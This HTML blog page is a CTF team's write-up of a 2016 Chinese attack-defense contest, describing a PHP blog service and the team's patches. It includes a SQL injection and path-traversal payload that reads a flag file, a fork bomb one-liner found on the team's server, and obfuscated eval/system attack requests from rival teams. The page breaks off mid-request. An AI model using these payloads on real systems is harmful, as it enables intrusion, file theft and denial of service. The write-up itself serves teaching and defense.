@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>2016 全国大学生信息安全竞赛初赛 Writeup | Asuri Team</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="得益于初赛的人品，我们有幸入围了决赛。但是对于决赛的比赛方式：攻防赛，我们并不了解，事先也不知道需要准备哪些东西，只是配了几个扫描器，然后就是之前用的 IDA 之类的工具和各种语言环境。经过两天的比赛，最终成绩是第 12 名（如果没有赛后的名次变动的话）。这次比赛确实让我学到了一些东西，下面我就来说一说吧~ 各组选手维护相同的一系列服务，每五分钟（第二天改为了三分钟）为一轮，有一个flag 文件是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2016 全国大学生信息安全竞赛初赛 Writeup">
+<meta property="og:url" content="http://asuri.org/2016/08/13/2016-nationwide-ctf-first-writeup/index.html">
+<meta property="og:site_name" content="Asuri Team">
+<meta property="og:description" content="得益于初赛的人品，我们有幸入围了决赛。但是对于决赛的比赛方式：攻防赛，我们并不了解，事先也不知道需要准备哪些东西，只是配了几个扫描器，然后就是之前用的 IDA 之类的工具和各种语言环境。经过两天的比赛，最终成绩是第 12 名（如果没有赛后的名次变动的话）。这次比赛确实让我学到了一些东西，下面我就来说一说吧~ 各组选手维护相同的一系列服务，每五分钟（第二天改为了三分钟）为一轮，有一个flag 文件是">
+<meta property="og:locale">
+<meta property="article:published_time" content="2016-08-13T18:25:00.000Z">
+<meta property="article:modified_time" content="2023-04-07T12:29:53.434Z">
+<meta property="article:author" content="All Members">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div id="container">
+    
+
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Asuri Team</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/members">Members</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-2016-nationwide-ctf-first-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/13/2016-nationwide-ctf-first-writeup/" class="article-date">
+  <time datetime="2016-08-13T18:25:00.000Z" itemprop="datePublished">2016-08-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2016 全国大学生信息安全竞赛初赛 Writeup
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/67d0b10056c602378e25de466c83e7dd?s=48">
+    <div class="article-author-info">
+      <a href="/author/rexskz" class="article-author-name">Rex Zeng</a>
+      <a target="_blank" rel="noopener" href="https://www.rexskz.info/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。">音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>得益于初赛的人品，我们有幸入围了决赛。但是对于决赛的比赛方式：攻防赛，我们并不了解，事先也不知道需要准备哪些东西，只是配了几个扫描器，然后就是之前用的 IDA 之类的工具和各种语言环境。经过两天的比赛，最终成绩是第 12 名（如果没有赛后的名次变动的话）。这次比赛确实让我学到了一些东西，下面我就来说一说吧~</p>
+<p>各组选手维护相同的一系列服务，每五分钟（第二天改为了三分钟）为一轮，有一个flag 文件是 <code>/home/flag/flag</code>，你需要努力获取其它队伍的 flag 文件，也要尽量保证自己的 flag 文件不会被获取。每一轮这个文件的内容都会变，每一轮每个队伍只能提交获取到的其它各个队伍的 flag 各一次。也就是说，如果你不把漏洞修好，那么每一轮都可以被所有发现该漏洞的队伍攻击一次；每一轮会有一次服务存活检测，如果服务 down 掉了，丢失的分数会更多。</p>
+<p>由于这次的题目类型大多是 PWN 的，而我是一只 WEB 狗，所以大部分的分数并不是我拿的，对于 PWN 的题目我也没法做什么分析。这次比赛的 WEB 题是这样的：你要维护的是一个简单的博客系统，使用的框架是 PHP Slim，支持最简单的注册、登录、发博文（标题、纯文本内容、模板名称）的功能。flag 文件是 <code>/home/flag/flag</code>，属于 <code>www-data</code>，权限为 511（每一轮自动换）。我们需要获取其它队伍的 flag 文件中的内容。</p>
+<p>与之同时发布的还有一道 PWN 题，@沈园 同学果断接下了这个锅（事实上我们几乎所有有成绩的 PWN 题，修补漏洞和编写 EXP 都是他负责的，在此先膜拜一下 ），我和@SummerZhang 同学开始看 WEB。</p>
+<p>首先先用 <code>tar</code> 命令将整个 web 目录打包，放到 <code>/tmp</code> 下，然后通过 <code>scp</code> 命令将其复制到本地。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp ctf@10.250.111.11:/tmp/www.tar.gz ./www.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>解压缩之后对里面的文件进行逐一查看：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">web</span><br><span class="line">├─html</span><br><span class="line">│  ├─css</span><br><span class="line">│  ├─fonts</span><br><span class="line">│  │  └─roboto</span><br><span class="line">│  ├─img</span><br><span class="line">│  └─js</span><br><span class="line">├─log</span><br><span class="line">├─templates</span><br><span class="line">│  └─note_tpl</span><br><span class="line">└─vendor</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>html</code> 文件夹中主要是 PHP 文件，<code>config.php</code> 是一些配置项，包括数据库的账号和密码，由于每一队维护的服务代码都是相同的，而且我们也没权限修改数据库的登录密码，因此这些无需修改。但是上面有这么一句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;displayErrorDetails&#x27;</span>] = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
+
+<p>为了保险起见还是改成 <code>false</code> 吧。接下来是 <code>db.php</code>，是自己写的一个库文件，我们大概能感觉到这里面会有 SQL 注入的风险。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span>(<span class="params"><span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$operate</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$value</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;where[] = sprintf(<span class="string">&quot;%s %s &#x27;%s&#x27;&quot;</span>, <span class="keyword">$this</span>-&gt;filter(<span class="variable">$key</span>), <span class="variable">$operate</span>, <span class="keyword">$this</span>-&gt;filter(<span class="variable">$value</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到这个函数的时候我还诧异：居然写了过滤？然而找到这个函数之后才发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>坑爹呢！于是赶紧在 return 的值外面包了层 <code>addslashes</code>。继续往下看有个 <code>select</code> 函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$value</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="keyword">$this</span>-&gt;where) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$sql</span> = sprintf(<span class="string">&quot;SELECT %s FROM %s &quot;</span>, <span class="variable">$value</span>, <span class="keyword">$this</span>-&gt;table);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$where</span> = implode(<span class="string">&#x27; AND &#x27;</span>, <span class="keyword">$this</span>-&gt;where);</span><br><span class="line">        <span class="variable">$sql</span> = sprintf(<span class="string">&quot;SELECT %s FROM %s WHERE %s&quot;</span>, <span class="variable">$value</span>, <span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sql</span> .= <span class="keyword">$this</span>-&gt;limit;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;limit = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="keyword">$this</span>-&gt;conn, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$result</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$tmp</span> = mysqli_fetch_row(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="variable">$ret</span>[] = <span class="variable">$tmp</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> @<span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不用想了，<code>$where</code> 这儿也有问题。在 <code>else</code> 一段为它添加 <code>addslashes</code> 吧：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$where</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$o</span>[<span class="variable">$key</span>] = addslashes(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$where</span> = implode(<span class="string">&#x27; AND &#x27;</span>, <span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$sql</span> = sprintf(<span class="string">&quot;SELECT %s FROM %s WHERE %s&quot;</span>, <span class="variable">$value</span>, <span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面是一个 <code>insert</code> 函数，不定参数。其中有一句似乎是调用了 <code>$this-&amp;gt;filter</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$args_list</span> = array_map(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="string">&#x27;filter&#x27;</span>), func_get_args());</span><br></pre></td></tr></table></figure>
+
+<p>这段应该是没问题的，所以不改了。下面的 <code>sess</code> 类和 <code>hello</code> 函数也没发现什么问题。至此，<code>db.php</code> 已经没有什么明显的 BUG 了。接下来看 <code>index.php</code>，其中对路由 <code>/list</code> 的处理中，有一段看起来可能有问题：获取到文章的信息存放到 <code>$result</code> 之后，执行渲染的函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;view-&gt;render(<span class="variable">$response</span>, <span class="string">&quot;/list.tpl&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>     =&gt; <span class="variable">$hello</span>,</span><br><span class="line">    <span class="string">&#x27;notes&#x27;</span>        =&gt; <span class="variable">$result</span>,</span><br><span class="line">    <span class="string">&#x27;total_page&#x27;</span>   =&gt; <span class="variable">$total_page</span>,</span><br><span class="line">    <span class="string">&#x27;current_page&#x27;</span> =&gt; <span class="variable">$current_page</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>/list.tpl</code> 文件中有这样一段：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> note in notes %&#125;</span><br><span class="line">    &#123;% embed note<span class="number">.3</span> %&#125;</span><br><span class="line">        &#123;% block title %&#125;&#123;&#123; note<span class="number">.1</span> &#125;&#125;&#123;% endblock %&#125;</span><br><span class="line">        &#123;% block content %&#125;&#123;&#123; note<span class="number">.2</span> &#125;&#125;&#123;% endblock %&#125;</span><br><span class="line">    &#123;% endembed %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>note.3</code> 是我们发这篇文章时选择的模板文件，它是在路由 <code>/post</code> 中被这样生成的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$title</span> = <span class="variable">$parsedBody</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$parsedBody</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="variable">$temp</span> = <span class="string">&quot;/note_tpl/<span class="subst">&#123;$parsedBody[&#x27;temp&#x27;]&#125;</span>.tpl&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;table(<span class="string">&#x27;notes&#x27;</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;insert(<span class="variable">$username</span>, <span class="variable">$title</span>, <span class="variable">$content</span>, <span class="variable">$temp</span>);</span><br></pre></td></tr></table></figure>
+
+<p>当然，如果 <code>filter</code> 函数没有修改的话，可以这样直接注入：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.250.1xx.11</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=[logged_session_id]</span><br><span class="line">[Other headers]</span><br><span class="line"></span><br><span class="line">content=xxx&amp;temp=0&amp;title=1%27%2C+%27title%27%2C+%27%5C%2Fnote_tpl%5C%2F..%5C%2F..%5C%2F..%5C%2F..%5C%2Fhome%5C%2Fflag%5C%2Fflag%27%29+%23+</span><br></pre></td></tr></table></figure>
+
+<p>这样拼接出来的 SQL 是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> notes <span class="keyword">VALUES</span> (<span class="string">&#x27;[logged_username]&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;\/note_tpl\/..\/..\/..\/..\/home\/flag\/flag&#x27;</span>) <span class="comment"># &#x27;, &#x27;xxx&#x27;, &#x27;0&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>于是在 render 的时候会触发文件包含的漏洞。如果数据库防了注入，这招就失灵了。但是我们可以这样：发现数据库的 <code>template</code> 字段类型是 <code>varchar</code>，有长度限制，我们只需要用空格填满剩余的空间即可：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=0&amp;content=xxx&amp;temp=..%2F..%2F..%2F..%2Fhome%2Fflag%2Fflag++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br></pre></td></tr></table></figure>
+
+<p>于是存到数据库中的就相当于 <code>/home/flag/flag</code> 了。要说这个也属于逻辑设计不合理，应该是在数据库存放文件名，然后渲染之前现场拼接路径。其实 Slim 本身也做了一层过滤，在 <code>vendor/twig/twig/lib/Twig/Loader/Filesystem.php</code> 中有过滤的函数，把注释去掉就可以限定包含的文件只能在当前目录下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">validateName</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> !== strpos(<span class="variable">$name</span>, <span class="string">&quot;\0&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Twig_Error_Loader(<span class="string">&#x27;A template name cannot contain NUL bytes.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$name</span> = ltrim(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="variable">$parts</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$level</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$parts</span> <span class="keyword">as</span> <span class="variable">$part</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;..&#x27;</span> === <span class="variable">$part</span>) &#123;</span><br><span class="line">            --<span class="variable">$level</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;.&#x27;</span> !== <span class="variable">$part</span>) &#123;</span><br><span class="line">            ++<span class="variable">$level</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$level</span> &amp;lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// throw new Twig_Error_Loader(sprintf(&#x27;Looks like you try to load a template outside configured directories (%s).&#x27;, $name));</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是这么修改太麻烦了，我们看了一下，只有三个模板，文件名分别是 1、2、3……于是果断加了一句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$parsedBody</span>[<span class="string">&#x27;temp&#x27;</span>] = intval(<span class="variable">$parsedBody</span>[<span class="string">&#x27;temp&#x27;</span>]);</span><br><span class="line"><span class="comment">// 下面这句是原来的</span></span><br><span class="line"><span class="variable">$temp</span> = <span class="string">&quot;/note_tpl/<span class="subst">&#123;$parsedBody[&#x27;temp&#x27;]&#125;</span>.tpl&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这下管你什么文件包含呢，通通没办法了吧？于是第一天我们的 WEB 题没有丢分（有一段时间许多队伍的 WEB 被 DoS 了，而 DoS 是被规则禁止的攻击方式，不知道主办方会怎么处理，这段时间的丢分我就认为不算丢分吧），反倒还拿了其它队伍不少分。</p>
+<p>但是第二天就奇怪了，一大片队伍的 WEB 题都 down 掉了，我们不光 down 了，还被拿到了 flag。这怎么能忍？我们一遍遍排查代码，确认没有什么逻辑上的漏洞。然后突然发现服务器操作特别慢，于是 <code>ps aux</code> 了一下，发现了一大堆这样的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="built_in">echo</span> 123;<span class="function"><span class="title">x</span></span>() &#123; x|x&amp; &#125;;x</span><br></pre></td></tr></table></figure>
+
+<p>卧槽，居然连 fork 炸弹都上了！这也是被规则禁止的，于是我们通知了主办方，主办方把所有队伍的 WEB 服务都重启了一遍，但是我们的 WEB 题还是既 down 又被 flag，简直神奇。看了一下 <code>/tmp</code> 目录下被上传了一堆 shell，但是我们的 ctf 用户没权限删除 www-data 用户创建的内容。后来我们直接给自己的服务器上了一个 webshell（这就是俗话说的：我急了连自己的机器都上 shell！），因为 webshell 就是以 www-data 用户身份运行的。我们没发现有什么可以上传文件的地方，但是确实是被 get shell 了，于是在找出上传方法之前，先将所有的 shell 文件 kill 掉，然后对其执行 <code>chmod 000</code>；刚才 ps 的时候还发现了一个定时发送 flag 的 crontab，于是也果断将其清空。</p>
+<p>就算这样还是被 flag 了，而且还在 down 着。我们在改完代码测试流程的时候偶然发现无法注册无法登录，于是猜想是不是数据库挂掉了，于是连进数据库一看，发现整个 database 全部被 drop 掉了……我们之前没有备份数据库，但是凭借着一点点记忆力以及@SummerZhang 同学根据代码推断数据库结构的能力，直接手动建起了数据库，恢复了服务的运行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="number">0</span>ops;</span><br><span class="line"><span class="keyword">use</span> <span class="number">0</span>ops;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (username <span class="built_in">varchar</span>(<span class="number">255</span>), <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>));</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> notes (username <span class="built_in">varchar</span>(<span class="number">255</span>), title <span class="built_in">varchar</span>(<span class="number">255</span>), <span class="keyword">content</span> <span class="built_in">varchar</span>(<span class="number">255</span>), temp <span class="built_in">varchar</span>(<span class="number">255</span>));</span><br></pre></td></tr></table></figure>
+
+<p>但是文件是怎么传上来的呢？我们在 <code>index.php</code> 文件的最一开始加了一段代码，可以将全部的 HTTP 请求包记录到 <code>/tmp/log.txt</code> 中，然后我们就在命令行中 <code>tail -f /tmp/log.txt</code>，开始分析所有的请求，最终锁定了两个奇怪的请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?59b620d4=6cd13eb6assert41a2e1&amp;edfd2=50cbin1d3&amp;208a8e=74fe6cdupload89f&amp;25411bcd=cdde9uploadf814ff266a&amp;cecc789=9ce4c38feeval1de&amp;2e84e621f=368c9e9baa918e&amp;7657=b4a6uploadb339c1b1a&amp;d54c1=1925cinto4aa&amp;28d5bd999f=e7fselect3c37&amp;b5fee3356a=c27ceeval2038&amp;43a7c6bb4=4b3b74assert7a51&amp;e9f6642fc=27b7into244&amp;10fd41aefe=44e18a89a6into2a2f&amp;08a3c97=ee6into3a909a4&amp;c565ef5=6ec68upload2224e453&amp;4df26=1fd254select4caaf&amp;3c743ef7=a69bbfaassertbfa</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.250.111.11</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Accept_encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User_agent</span>: python-requests/2.10.0</span><br><span class="line"><span class="attribute">Accept_language</span>: xh-ZA,sa;q=0.5,se;q=0.7,sm;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost/index.php?379=60c8and6cc&amp;8cdf38c0c=6f9%2Fbin%2Fbash96ca9&amp;62ca6c1a1=52f58bin4550b2b528&amp;9b4f5=c78d226select632b6&amp;70d7cb=b7bc3576bevale12&amp;id6=a45&amp;id7=b7c&amp;id8=TPp8K%2FzwM3%2F%2Fqn7rfXdJvnuo%2BE179U8e4jblqfr3KeJ7rX4qNSsureJmZY89Pg%3D%3D93d&amp;d99=9&amp;id10=707</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.250.111.11</span><br><span class="line"><span class="attribute">Accept_encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User_agent</span>: python-requests/2.7.0 CPython/2.7.9 Linux/4.0.0-kali1-amd64</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=k4146i6hp0os7siaa8c2526no7</span><br><span class="line"></span><br><span class="line">content=,1,0x2f6e6f74655f74706c2f2e2e2f2e2e2f2e2e2f2e2e2f686f6d652f666c61672f666c6167)--+xGj6Evnwu0Lbt4cl1oNKMJJTWOb21MNt5QdqMJiE4ojuUhtUb69&amp;nFXwtiv=</span><br><span class="line">Ok=system(&#x27;uWz1E2Ygq4jZA5JfdwoAVT17xr9Ped8gujeO&quot;.str_rot13(&quot;0xZ8FCS8uJQKVJXbXQY7wSYZF3ZowvUv0hw3LIN6E&quot;.base64_decode(&quot;ypyQrdo7V5t0sZVWBmaLBtmK6aZL7yMZul&quot;.eval(&#x27;xMFxdIFg4zkzyok0gEP2DjMnp8cFLiOlNC5EC776HARtCbn4NkycJ8QN&#x27;.var_dump(&quot;I1X5Qa4vZHVTjyhead&gt;eDY7920XJdQ44mKSHOLnvgJ&quot;.$_SERVER[HTTP_z7Hp57U](&quot;IKtFLD3vFLrxfig3hyZiUyGwP5Qt2QR3dClXFEr7v&#x27;)&quot;ARRnCZtnLPk54s77D5ILVT8UZxeXFjb5ViV1JKgGeCRHPRpjqoHw9cEE&#x27;))&#x27;fCvM6J7W0xC0PIPv6x2TPnpOlOOLvufuofXV4myGroWjw6&#x27;)&#x27;qeToFSdgfyXTwK9fFIITmodMiZLN6bhJ3iNMqm9AX60do&#x27;)</span><br><span 